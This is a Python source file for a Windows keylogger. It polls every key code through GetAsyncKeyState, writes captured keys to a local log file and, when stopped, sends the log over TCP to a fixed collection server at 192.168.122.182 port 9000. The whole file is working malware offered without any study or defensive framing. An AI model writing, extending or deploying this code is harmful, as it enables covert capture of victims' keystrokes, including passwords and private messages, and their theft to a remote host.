import ctypes
import socket
import os
import sys
from threading import Thread

class Keylogger:
    def __init__(self):
        self.log = ''
        self.file_name = 'keylogs.txt'
        self.server_addr = ('192.168.122.182', 9000)

    def append_log(self, string):
        self.log += str(string) + '\n'
        print('[DEBUG] Appended to log: '+str(string))

    def flush_log(self):
        with open(self.file_name, 'a') as f:
            f.write(self.log)
        self.log = ''
        print('[DEBUG] Flushed logs to file')

    def send_log(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(self.server_addr)
            with open(self.file_name, 'r') as f:
                data = f.read()
            s.sendall(data.encode())
            print('[DEBUG] Sent logs to server')
        except Exception as e:
            print('[ERROR] Could not send logs:', str(e))
        finally:
            s.close()

    def key_listener(self):
        last_key = None
        while True:
            for key in range(256):
                if ctypes.windll.user32.GetAsyncKeyState(key):
                    if last_key != key:
                        last_key = key
                        self.append_log(str(key))
                        print('[DEBUG] Logged key:', str(key))
            if len(self.log) > 1024:  # Flush log every so often to prevent it from getting too large
                self.flush_log()

    def run(self):
        t = Thread(target=self.key_listener)
        t.start()
        while True:
            try:
                if input('Enter "quit" to stop and send logs, or anything else to continue logging:\n') == 'quit':
                    break
            except KeyboardInterrupt:
                break
        self.flush_log()  # Flush remaining log before sending
        self.send_log()   # Send the logs to server
        print('[DEBUG] Stopped and sent logs')

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.run()